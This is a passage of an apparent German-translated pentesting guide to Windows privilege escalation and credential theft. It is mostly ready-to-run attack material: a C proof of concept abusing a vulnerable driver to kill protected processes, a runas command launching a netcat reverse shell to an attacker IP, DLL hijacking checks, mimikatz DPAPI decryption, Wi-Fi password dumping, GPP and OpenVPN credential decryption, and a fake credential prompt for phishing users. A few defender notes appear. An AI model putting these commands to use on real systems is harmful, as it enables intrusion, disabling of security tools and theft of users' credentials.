Windows erlaubt es Benutzern, Aktionen anzugeben, die ausgeführt werden sollen, wenn ein Dienst fehlschlägt. Diese Funktion kann so konfiguriert werden, dass sie auf ein binary zeigt. Wenn dieses binary ersetzbar ist, könnte privilege escalation möglich sein. More details can be found in the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Anwendungen

### Installierte Anwendungen

Prüfe **Berechtigungen der binaries** (vielleicht kannst du eines überschreiben und privilege escalation erreichen) und die **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Schreibberechtigungen

Prüfe, ob du eine Konfigurationsdatei modifizieren kannst, um eine bestimmte Datei zu lesen, oder ob du ein binary verändern kannst, das von einem Administrator-Konto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Ordner-/Dateiberechtigungen im System zu finden, ist:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ lädt automatisch jede Plugin-DLL aus seinen `plugins`-Unterordnern. Wenn eine beschreibbare portable/copy-Installation vorhanden ist, führt das Ablegen eines bösartigen Plugins zu automatischer Codeausführung innerhalb von `notepad++.exe` bei jedem Start (einschließlich aus `DllMain` und plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Systemstart ausführen

**Prüfe, ob du eine Registry oder ein Binary überschreiben kannst, das von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **autoruns locations to escalate privileges** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **third party weird/vulnerable** Treibern
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Wenn ein Treiber ein beliebiges Kernel-Read/Write‑Primitiv bereitstellt (häufig bei schlecht gestalteten IOCTL‑Handlern), kannst du zu SYSTEM eskalieren, indem du ein SYSTEM‑Token direkt aus dem Kernel‑Speicher stiehlst. Siehe die Schritt‑für‑Schritt‑Technik hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Bei Race‑Condition‑Bugs, bei denen der verwundbare Aufruf einen vom Angreifer kontrollierten Object Manager‑Pfad öffnet, kann ein absichtliches Verlangsamen der Lookup‑Operation (z. B. durch max‑Längen‑Komponenten oder tiefe Verzeichnisketten) das Zeitfenster von Mikrosekunden auf einige zehn Mikrosekunden erweitern:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry‑Hive‑Speicherkorruptions‑Primitives

Moderne Hive‑Vulnerabilities ermöglichen es, deterministische Layouts vorzubereiten, beschreibbare HKLM/HKU‑Nachfahren zu missbrauchen und Metadatenkorruption in kernel paged‑pool overflows ohne eigenen Treiber umzuwandeln. Lerne die komplette Kette hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Ausnutzen des fehlenden FILE_DEVICE_SECURE_OPEN bei Device‑Objekten (LPE + EDR kill)

Einige signierte Third‑Party‑Treiber erstellen ihr Device‑Objekt mit einer starken SDDL via IoCreateDeviceSecure, vergessen aber, FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics zu setzen. Ohne dieses Flag wird die sichere DACL nicht durchgesetzt, wenn das Device über einen Pfad mit einer zusätzlichen Komponente geöffnet wird, wodurch jeder nicht‑privilegierte Benutzer einen Handle erhalten kann, indem er einen Namespace‑Pfad wie diesen verwendet:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (aus einem realen Fall)

Sobald ein Benutzer das Device öffnen kann, können privilegierte IOCTLs, die der Treiber exponiert, für LPE und Manipulation missbraucht werden. Beispiele für in freier Wildbahn beobachtete Fähigkeiten:
- Handles mit Vollzugriff an beliebige Prozesse zurückgeben (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Uneingeschränkter raw disk read/write (offline tampering, boot-time persistence tricks).
- Beliebige Prozesse beenden, einschließlich Protected Process/Light (PP/PPL), wodurch AV/EDR‑Kills aus dem Userland über den Kernel möglich werden.

Minimales PoC‑Muster (User‑Mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Gegenmaßnahmen für Entwickler
- Setzen Sie immer FILE_DEVICE_SECURE_OPEN, wenn Sie Geräteobjekte erstellen, die durch eine DACL eingeschränkt werden sollen.
- Validieren Sie den Aufruferkontext für privilegierte Operationen. Fügen Sie PP/PPL-Prüfungen hinzu, bevor Sie Prozessbeendigungen oder die Rückgabe von Handles erlauben.
- Beschränken Sie IOCTLs (Zugriffs-Masken, METHOD_*, Eingabevalidierung) und erwägen Sie vermittelte Modelle (brokered models) anstelle direkter Kernel-Privilegien.

Erkennungsansätze für Verteidiger
- Überwachen Sie user-mode Öffnungen verdächtiger Device-Namen (z. B., \\ .\\amsdk*) und spezifische IOCTL-Sequenzen, die auf Missbrauch hindeuten.
- Setzen Sie Microsofts vulnerable driver blocklist (HVCI/WDAC/Smart App Control) durch und pflegen Sie eigene Zulassungs-/Sperrlisten.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Weitere Informationen dazu, wie man diese Prüfung ausnutzen kann:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Überprüfe, ob weitere bekannte Computer in der hosts file hardcoded sind
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netzwerkschnittstellen & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Offene Ports

Überprüfe von außen auf **eingeschränkte Dienste**
```bash
netstat -ano #Opened ports?
```
### Routing-Tabelle
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP-Tabelle
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-Regeln

[**Siehe diese Seite für Firewall-bezogene Befehle**](../basic-cmd-for-pentesters.md#firewall) **(Regeln auflisten, Regeln erstellen, deaktivieren, deaktivieren...)**

Mehr[ Befehle für network enumeration hier](../basic-cmd-for-pentesters.md#network)

### Windows-Subsystem für Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Die Binärdatei `bash.exe` kann auch in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` gefunden werden.

Wenn du root-Rechte erhältst, kannst du auf jedem Port lauschen (das erste Mal, wenn du `nc.exe` verwendest, um auf einem Port zu lauschen, fragt die GUI, ob `nc` von der Firewall zugelassen werden soll).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Um bash einfach als root zu starten, können Sie `--default-user root` ausprobieren

Sie können das `WSL`-Dateisystem im Ordner `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` erkunden

## Windows-Anmeldeinformationen

### Winlogon-Anmeldeinformationen
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials-Manager / Windows Vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Der Windows Vault speichert Benutzeranmeldeinformationen für Server, Websites und andere Programme, bei denen **Windows** die Benutzer **automatisch anmelden** kann. Auf den ersten Blick mag es so erscheinen, dass Benutzer dort ihre Facebook-, Twitter- oder Gmail-Anmeldedaten speichern könnten, damit sie sich automatisch über Browser anmelden. Das ist jedoch nicht der Fall.

Der Windows Vault speichert Anmeldeinformationen, mit denen Windows Benutzer automatisch anmelden kann, was bedeutet, dass jede **Windows-Anwendung, die Anmeldeinformationen benötigt, um auf eine Ressource zuzugreifen** (Server oder eine Website) **dieses Credential Manager** & Windows Vault nutzen kann und die gespeicherten Anmeldeinformationen verwendet, anstatt dass Benutzer ständig Benutzername und Passwort eingeben.

Solange Anwendungen nicht mit dem Credential Manager interagieren, denke ich nicht, dass sie die Anmeldeinformationen für eine bestimmte Ressource verwenden können. Wenn Ihre Anwendung also den Vault nutzen möchte, sollte sie irgendwie **mit dem credential manager kommunizieren und die Anmeldeinformationen für diese Ressource anfordern** vom Standard-Speicher-Vault.

Verwenden Sie das `cmdkey`, um die auf der Maschine gespeicherten Anmeldeinformationen aufzulisten.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dann können Sie `runas` mit der Option `/savecred` verwenden, um die gespeicherten Anmeldeinformationen zu nutzen. Das folgende Beispiel ruft ein remote binary über ein SMB share auf.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verwendung von `runas` mit einem bereitgestellten Satz von Anmeldeinformationen.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Beachte, dass mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), oder vom [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** bietet eine Methode zur symmetrischen Verschlüsselung von Daten, die hauptsächlich im Windows-Betriebssystem zur symmetrischen Verschlüsselung privater asymmetrischer Schlüssel verwendet wird. Diese Verschlüsselung nutzt ein Benutzer- oder Systemsgeheimnis, das maßgeblich zur Entropie beiträgt.

**DPAPI ermöglicht die Verschlüsselung von Schlüsseln durch einen symmetrischen Schlüssel, der aus den Login-Geheimnissen des Benutzers abgeleitet wird**. Bei Systemverschlüsselung verwendet es die Domain-Authentifizierungsgeheimnisse des Systems.

Verschlüsselte Benutzer-RSA-Schlüssel werden unter Verwendung von DPAPI im Verzeichnis %APPDATA%\Microsoft\Protect\{SID} gespeichert, wobei {SID} den Benutzer-[Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) darstellt. **Der DPAPI-Schlüssel, der gemeinsam mit dem Master-Schlüssel, der die privaten Schlüssel des Benutzers in derselben Datei schützt, abgelegt ist**, besteht typischerweise aus 64 bytes Zufallsdaten. (Es ist wichtig zu beachten, dass der Zugriff auf dieses Verzeichnis eingeschränkt ist, sodass ein Auflisten seines Inhalts über den dir-Befehl in CMD verhindert wird, obwohl es über PowerShell aufgelistet werden kann).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Du kannst das **mimikatz module** `dpapi::masterkey` mit den passenden Argumenten (`/pvk` oder `/rpc`) verwenden, um es zu entschlüsseln.

Die **credentials files protected by the master password** befinden sich normalerweise in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Du kannst das **mimikatz module** `dpapi::cred` mit dem passenden `/masterkey` zum Entschlüsseln verwenden.\
Du kannst viele **DPAPI** **masterkeys** aus dem **memory** mit dem `sekurlsa::dpapi` module extrahieren (wenn du root bist).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Anmeldeinformationen

**PowerShell-Anmeldeinformationen** werden oft für **Scripting** und Automatisierungsaufgaben verwendet, um verschlüsselte Anmeldeinformationen bequem zu speichern. Die Anmeldeinformationen sind mit **DPAPI** geschützt, was typischerweise bedeutet, dass sie nur vom selben Benutzer auf demselben Computer, auf dem sie erstellt wurden, entschlüsselt werden können.

Um eine **PowerShell-Anmeldeinformation** aus der Datei, die sie enthält, zu **entschlüsseln**, kannst du Folgendes tun:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### WLAN
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gespeicherte RDP-Verbindungen

Sie finden diese unter `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
und in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Zuletzt ausgeführte Befehle
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop-Anmeldeinformationsverwaltung**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Verwenden Sie das **Mimikatz** `dpapi::rdg` Modul mit dem passenden `/masterkey`, um **beliebige .rdg-Dateien zu entschlüsseln**\
Sie können **viele DPAPI masterkeys** aus dem Speicher mit dem Mimikatz `sekurlsa::dpapi` Modul extrahieren

### Sticky Notes

Viele verwenden die StickyNotes-App auf Windows-Arbeitsstationen, um **Passwörter zu speichern** und andere Informationen, ohne zu wissen, dass es sich um eine Datenbankdatei handelt. Diese Datei befindet sich unter `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` und es lohnt sich immer, danach zu suchen und sie zu untersuchen.

### AppCmd.exe

**Beachten Sie, dass zum Wiederherstellen von Passwörtern aus AppCmd.exe Administratorrechte erforderlich sind und das Programm unter einem High Integrity level ausgeführt werden muss.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\  
Wenn diese Datei vorhanden ist, ist es möglich, dass einige **credentials** konfiguriert wurden und **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Prüfe, ob `C:\Windows\CCM\SCClient.exe` existiert .\
Installationsprogramme werden **mit SYSTEM privileges ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dateien und Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH-Hostschlüssel
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH-Keys in der Registry

SSH-Private-Keys können im Registry-Schlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein; überprüfe daher, ob sich dort etwas Interessantes befindet:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Wenn Sie einen Eintrag in diesem Pfad finden, handelt es sich wahrscheinlich um einen gespeicherten SSH key. Er ist verschlüsselt gespeichert, kann aber mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) leicht entschlüsselt werden.\
Mehr Informationen zu dieser Technik hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Wenn der `ssh-agent`-Dienst nicht läuft und Sie möchten, dass er beim Booten automatisch startet, führen Sie aus:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Es scheint, dass diese Technik nicht mehr gültig ist. Ich habe versucht, einige ssh keys zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per ssh bei einer Maschine anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys existiert nicht und procmon hat die Verwendung von `dpapi.dll` während der Authentifizierung mit asymmetrischen Schlüsseln nicht identifiziert.

### Unbeaufsichtigte Dateien
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Sie können auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM Sicherungen
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher gab es eine Funktion, mit der benutzerdefinierte lokale Administrator-Konten über Group Policy Preferences (GPP) auf einer Gruppe von Maschinen bereitgestellt werden konnten. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Erstens konnten die Group Policy Objects (GPOs), die als XML-Dateien im SYSVOL gespeichert sind, von jedem Domain-Benutzer eingesehen werden. Zweitens konnten die in diesen GPPs enthaltenen Passwörter, die mit AES256 unter Verwendung eines öffentlich dokumentierten Standard-Schlüssels verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Das stellte ein ernstes Risiko dar, da so Benutzern erhöhte Privilegien möglich wurden.

Zur Minderung dieses Risikos wurde eine Funktion entwickelt, die lokal zwischengespeicherte GPP-Dateien nach einem nicht leeren "cpassword"-Feld durchsucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei, was bei der Identifizierung und Behebung dieser Sicherheitslücke hilft.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Um das cPassword zu entschlüsseln:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec verwenden, um die Passwörter zu erhalten:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Webkonfiguration
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Beispiel einer web.config mit credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN-Zugangsdaten
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Protokolle
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Nach Credentials fragen

Sie können immer **den Benutzer auffordern, seine Credentials oder sogar die Credentials eines anderen Benutzers einzugeben**, wenn Sie denken, dass er sie kennen könnte (beachten Sie, dass **das direkte Fragen** des Clients nach den **Credentials** wirklich **riskant** ist):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mögliche Dateinamen, die credentials enthalten**

Bekannte Dateien, die vor einiger Zeit **passwords** in **clear-text** oder **Base64** enthielten
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Alle vorgeschlagenen Dateien durchsuchen:
```
cd C:\
